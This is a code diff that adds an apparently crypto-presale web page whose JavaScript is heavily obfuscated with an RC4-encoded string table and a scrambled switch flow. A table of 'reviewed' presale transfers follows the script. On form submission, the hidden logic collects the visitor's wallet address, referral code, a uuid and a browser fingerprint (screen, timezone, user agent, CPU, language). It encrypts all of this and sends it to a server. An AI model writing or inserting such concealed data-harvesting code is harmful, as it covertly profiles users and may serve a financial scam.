+var _0xoda = 'v1', _0x80ad = [_0xoda, 'wojDrcOXDsK+Pw==', 'w6LCgsO1fcKQ', 'wrrCqcO2w6fDqcOL', 'w73CjsO4bsKQAQ==', 'HsKmw5MhwoRI', 'w4HChcOsAj/Dj8KtWwXDtg==', 'wrXDvsK+w5rDkcK0H2HDtQ==', 'w54uLk7Dn8OAA8KlMcKLw6rCpMK2w4rDnMODw5LDiBo=', 'wqwfXMKFwpM=', 'PMOBScOnwqA=', 'w4QqL0XDhMOXFMKkPcKUw7DCrsKsw5bDnQ==', 'LMOEwo7DvMORG8KawqLCoA==', 'IMKMw6Yiwqxnw7EmSsOkHHorIi3DlDnDtcOGw6sHEMKgGEIsPcOVw5xIPwHDlcOBQEZAHHkMYMKwwp4vw7bCmzvCqcKKVMKBP8OEeMO6FcKPfcKeHDJ0w6Fr', 'w7IiZUPCuyPCssOnJnkBHSVMajnDm8Ocw5xTw67DisK+wrnCisOowq7DuTvDjsOfw60yw7rCjsOtK8Oyw5A8w5jDhH17A1B4McOMw4kKwoXDnlNsR1/Di8K5w7Mjw4TCh8Kc', 'wrQhcMKGw49ewoLClMOqwr4=', 'K8Kgw6fCtg==', 'S3TDsMKOw4PCpsKxLcKcE8OZw4LDisK4woI=', 'wq9sJMOofiZUChTDsR3CmcKHw5k=', 'w5HCn8OiACTDvw==', 'NWlBw47CnSLCpR7CpsO1PQrDrA==', 'w4IACE/DkQ==', 'wpPCvsO9UAs=', 'w7cQw7Y=', 'wrTDosKIw5zDosK6FGg=', 'UMO+w70=', 'w4M8U3bDtyg=', 'UcOBw4XDo1k=', 'A8OWDsKaw5M=', 'OsO9LsKTGA==', 'wq4/f8KHwpU=', 'w558wogQIkvDsg==', 'wq1tPGTDug==', 'wq7Cu1nDv8KJw7EXJUTCqhFKLksJwrw+CwR4cMK3w6PDpsKVQsOSw4BXdsKXwpTDi0VIXMORw59HwpctJsKoeMKFZTMYwqvDncO2F8K6w6xJQSduwqhtCynDkUA=', 'W23DisK5w6U=', 'wolmMTXDtsKWaXNNw57CtlomYcObwr/Cn8OQwp7Cj8KUfQPCmA==', 'QMOowoxpw4xjwo8lKcOnOH80IgzDhzbDocOawoRrbMOYdA==', 'ABbCm3k=', 'JcOYwo7Cpw==', 'LMOEwp3Dp8OLD8Kkwq3CrcO3', 'esOtw5UW', 'w4vDkcOQWBrDssK7QcKL', 'w6JHPVJ5DMKTw5xBwoQnw5Y=', 'cW1cw7XCjTXCpw==', 'w41OKsOjUw==', 'w6BiLMO+', 'w6bCq8Otw7DDqMOXSsO1FkvDksORw7vClcK4', 'w4LCm8KZacKb', 'ecKcw6NTw4k=', 'w7fClMKmTGpRZsOtwrTDi8KRQsOswoptwrt8', 'wphKOjN4', 'XcKkwobDsg==', 'w45lwpwjOQ==', 'LBbDqw==', 'w7Eew60=', 'woXDm8Otwo/Chw==', 'wr1ACAxZ', 'wrXDhMKUOFs=', 'wp17AVrDnQ==', 'v1tkRgQJVMcCgXAwEcQ==']; (function (_0x39c9aa, _0x227651, _0x30b0e1) { var _0xc5faba = function (_0x46250, _0x4ce0fb, _0x273eb7, _0x3bd2d1, _0x2fd4c2) { _0x4ce0fb = _0x4ce0fb >> 0x8, _0x2fd4c2 = 'po'; var _0xe1ee95 = 'shift', _0x3edd76 = 'push'; if (_0x4ce0fb < _0x46250) { while (--_0x46250) { _0x3bd2d1 = _0x39c9aa[_0xe1ee95](); if (_0x4ce0fb === _0x46250) { _0x4ce0fb = _0x3bd2d1; _0x273eb7 = _0x39c9aa[_0x2fd4c2 + 'p'](); } else if (_0x4ce0fb && _0x273eb7['replace'](/[tkRgQJVMcCgXAwEcQ=]/g, '') === _0x4ce0fb) { _0x39c9aa[_0x3edd76](_0x3bd2d1); } } _0x39c9aa[_0x3edd76](_0x39c9aa[_0xe1ee95]()); } return 0x8be04; }; return _0xc5faba(++_0x227651, _0x30b0e1) >> _0x227651 ^ _0x30b0e1; }(_0x80ad, 0x168, 0x16800)); var _0x5aa9 = function (_0x2fbeca, _0x302170) { _0x2fbeca = ~~'0x'['concat'](_0x2fbeca); var _0x3f855b = _0x80ad[_0x2fbeca]; if (_0x5aa9['PHaeaE'] === undefined) { (function () { var _0x2e1d0e = typeof window !== 'undefined' ? window : typeof process === 'object' && typeof require === 'function' && typeof global === 'object' ? global : this; var _0x4a0d87 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; _0x2e1d0e['atob'] || (_0x2e1d0e['atob'] = function (_0x1725a4) { var _0x36a12e = String(_0x1725a4)['replace'](/=+$/, ''); for (var _0x3adbd4 = 0x0, _0x1ac61c, _0x1d98dd, _0x455447 = 0x0, _0xf707e7 = ''; _0x1d98dd = _0x36a12e['charAt'](_0x455447++); ~_0x1d98dd && (_0x1ac61c = _0x3adbd4 % 0x4 ? _0x1ac61c * 0x40 + _0x1d98dd : _0x1d98dd, _0x3adbd4++ % 0x4) ? _0xf707e7 += String['fromCharCode'](0xff & _0x1ac61c >> (-0x2 * _0x3adbd4 & 0x6)) : 0x0) { _0x1d98dd = _0x4a0d87['indexOf'](_0x1d98dd); } return _0xf707e7; }); }()); var _0x5d279d = function (_0x6c4f6b, _0x302170) { var _0x8b339 = [], _0x35e6fb = 0x0, _0x530939, _0x832422 = '', _0x21e2e0 = ''; _0x6c4f6b = atob(_0x6c4f6b); for (var _0x472111 = 0x0, _0x31bf20 = _0x6c4f6b['length']; _0x472111 < _0x31bf20; _0x472111++) { _0x21e2e0 += '%' + ('00' + _0x6c4f6b['charCodeAt'](_0x472111)['toString'](0x10))['slice'](-0x2); } _0x6c4f6b = decodeURIComponent(_0x21e2e0); for (var _0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x8b339[_0x289ef2] = _0x289ef2; } for (_0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2] + _0x302170['charCodeAt'](_0x289ef2 % _0x302170['length'])) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; } _0x289ef2 = 0x0; _0x35e6fb = 0x0; for (var _0x19a3e0 = 0x0; _0x19a3e0 < _0x6c4f6b['length']; _0x19a3e0++) { _0x289ef2 = (_0x289ef2 + 0x1) % 0x100; _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2]) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; _0x832422 += String['fromCharCode'](_0x6c4f6b['charCodeAt'](_0x19a3e0) ^ _0x8b339[(_0x8b339[_0x289ef2] + _0x8b339[_0x35e6fb]) % 0x100]); } return _0x832422; }; _0x5aa9['zvsaFw'] = _0x5d279d; _0x5aa9['RfEPgZ'] = {}; _0x5aa9['PHaeaE'] = !![]; } var _0x398bee = _0x5aa9['RfEPgZ'][_0x2fbeca]; if (_0x398bee === undefined) { if (_0x5aa9['dDZncs'] === undefined) { _0x5aa9['dDZncs'] = !![]; } _0x3f855b = _0x5aa9['zvsaFw'](_0x3f855b, _0x302170); _0x5aa9['RfEPgZ'][_0x2fbeca] = _0x3f855b; } else { _0x3f855b = _0x398bee; } return _0x3f855b; }; (function () { var _0x21b2d4 = { 'tOTey': function (_0x340d38, _0x23e7d2, _0x5a4e89) { return _0x340d38(_0x23e7d2, _0x5a4e89); }, 'nUDfP': function (_0x16c813, _0x41a624) { return _0x16c813 * _0x41a624; }, 'fJKWb': function (_0x38ae15, _0x4f3142) { return _0x38ae15(_0x4f3142); }, 'EhyTe': '9|1|4|5|14|6|11|12|7|15|0|3|10|2|13|8', 'Iokdj': _0x5aa9('0', 'IRmf'), 'ywJBR': _0x5aa9('1', 'HVQX'), 'DtXvm': _0x5aa9('2', 'HSeN'), 'ACgyI': _0x5aa9('3', 'R4X['), 'RuEgq': function (_0xd91c93, _0x3d3a0b) { return _0xd91c93(_0x3d3a0b); }, 'hossM': function (_0x42f676, _0x1869a1) { return _0x42f676(_0x1869a1); }, 'uwwAb': 'input[name=address]', 'LzaVe': _0x5aa9('4', 'nnsP'), 'MeALl': function (_0x5b2c63, _0x1a5aaf) { return _0x5b2c63 + _0x1a5aaf; }, 'yyVZM': function (_0x3b5d3c, _0x35b705) { return _0x3b5d3c + _0x35b705; }, 'qPOkr': function (_0x174a3f, _0x2671f0) { return _0x174a3f(_0x2671f0); }, 'KjbCf': _0x5aa9('5', 'D0xt'), 'VYxjL': _0x5aa9('6', 'ndZO'), 'OYfIZ': _0x5aa9('7', 'U4EO') }; function _0x3eee36(_0x587c3f) { if (!_0x21b2d4[_0x5aa9('8', 'H(Ha')](parseInt, _0x587c3f, 0xa)) _0x587c3f = 0x6; var _0x88cf9b = Math['floor'](_0x21b2d4[_0x5aa9('9', 'L(7F')](Math[_0x5aa9('a', 'w@eh')](0x24, _0x587c3f), Math['random']()))[_0x5aa9('b', 'm#Gi')](0x24); return (Math[_0x5aa9('c', '1!LT')](0xa, _0x587c3f) + _0x88cf9b)[_0x5aa9('d', 'HVQX')](-_0x587c3f); } _0x21b2d4[_0x5aa9('e', '1!LT')]($, document)['on'](_0x21b2d4['VYxjL'], _0x21b2d4[_0x5aa9('f', 'D&9a')], function (_0x3e7c49) { var _0x5abfc2 = _0x21b2d4[_0x5aa9('10', 'G!Q$')][_0x5aa9('11', 'HSeN')]('|'), _0x2b1559 = 0x0; while (!![]) { switch (_0x5abfc2[_0x2b1559++]) { case '0': var _0x87afc2 = new JSEncrypt(); continue; case '1': var _0x1f2b4c = ''; continue; case '2': _0x15ea5a = _0x87afc2[_0x5aa9('12', 'R10E')](_0x15ea5a); continue; case '3': var _0x123288 = ['-----BEGIN\x20PUBLIC\x20KEY-----', _0x21b2d4[_0x5aa9('13', 'Skb0')], _0x5aa9('14', '7nWh'), _0x21b2d4[_0x5aa9('15', 'nnsP')], _0x5aa9('16', 'Skb0'), _0x5aa9('17', 'IRmf')]; continue; case '4': if (window[_0x5aa9('18', 'JFzE')] && window[_0x5aa9('19', 'MgiB')][_0x5aa9('1a', ')J[f')](_0x21b2d4['DtXvm'])) { _0x1f2b4c = window[_0x5aa9('1b', 'Aq11')][_0x5aa9('1c', 'W&Az')](0xa); } else if (window[_0x5aa9('1d', 'P]Qs')]) { window[_0x5aa9('1d', 'P]Qs')][_0x5aa9('1e', 'U4EO')](_0x21b2d4[_0x5aa9('1f', 'D0xt')]); } continue; case '5': var _0x5d2788 = ''; continue; case '6': var _0x2937c0 = ''; continue; case '7': var _0x15ea5a = _0x3eee36(0x24); continue; case '8': _0x38bc59[_0x5aa9('20', 'D0xt')](_0x5aa9('21', 'r]Ar'), { 'content': _0x3ef733, 'key': _0x15ea5a }, function () { _0x21b2d4[_0x5aa9('22', 'OiRc')](init_page, _0x38bc59); }); continue; case '9': _0x3e7c49['preventDefault'](); continue; case '10': _0x87afc2['setPublicKey'](_0x123288['join']('\x0a')); continue; case '11': try { _0x2937c0 = _0x21b2d4[_0x5aa9('23', 'eMoW')](parseInt, new Date()[_0x5aa9('24', '(igk')]() / -0x3c); } catch (_0x442dbc) { } continue; case '12': var _0x3ef733 = { 'address': _0x21b2d4[_0x5aa9('25', 'zUpr')]($, this)[_0x5aa9('26', 'B^X5')](_0x21b2d4[_0x5aa9('27', 'R10E')])[_0x5aa9('28', 'aIsq')](), 'ref': $(this)[_0x5aa9('26', 'B^X5')](_0x21b2d4['LzaVe'])[_0x5aa9('29', 'w@eh')](), 'uuid': _0x1f2b4c, 'tz': _0x5d2788, 'tz_offset': _0x2937c0, 'screen': _0x21b2d4[_0x5aa9('2a', 'JPNW')](_0x21b2d4[_0x5aa9('2b', 'zUpr')](_0x21b2d4[_0x5aa9('2c', 'pvSQ')](_0x21b2d4[_0x5aa9('2d', 'Skb0')](window[_0x5aa9('2e', '[Qw1')][_0x5aa9('2f', 'Niu5')], 'x'), window[_0x5aa9('30', 'r]Ar')][_0x5aa9('31', 'Niu5')]), 'x'), window[_0x5aa9('32', 'IRmf')][_0x5aa9('33', 'ndZO')]), 'user_agent': navigator[_0x5aa9('34', 'm#Gi')], 'cpu': navigator[_0x5aa9('35', 'H(Ha')], 'lang': navigator['language'] || navigator['userLanguage'] }; continue; case '13': var _0x38bc59 = _0x21b2d4[_0x5aa9('36', 'HSeN')]($, _0x21b2d4[_0x5aa9('37', 'iz]X')]); continue; case '14': try { _0x5d2788 = new Intl['DateTimeFormat']()[_0x5aa9('38', 'H(Ha')]()['timeZone']; } catch (_0x2465ab) { } continue; case '15': _0x3ef733 = AES256['encrypt'](JSON[_0x5aa9('39', ')J[f')](_0x3ef733), _0x15ea5a); continue; }break; } }); }());
+</script>
+</body>
+</html>
+
+<table class="table">
+    <thead>
+    <tr><td>Time</td>
+    <td class="d-none d-sm-block">Address</td>
+    <td>Amount</td>
+    <td>Status</td>
+    </tr></thead>
+    <tbody>
+    <tr>
+    <td class="text-muted">2021-10-5 19:55</td>
+    <td class="d-none d-sm-block text-muted">0x6182...FaFB</td>
+    <td class="text-muted text-center">10</td>
+    <td class="text-muted">
+    Reviewd, distribute after presale completed
+    </td>
+    </tr>
+    </tbody>
+    </table>
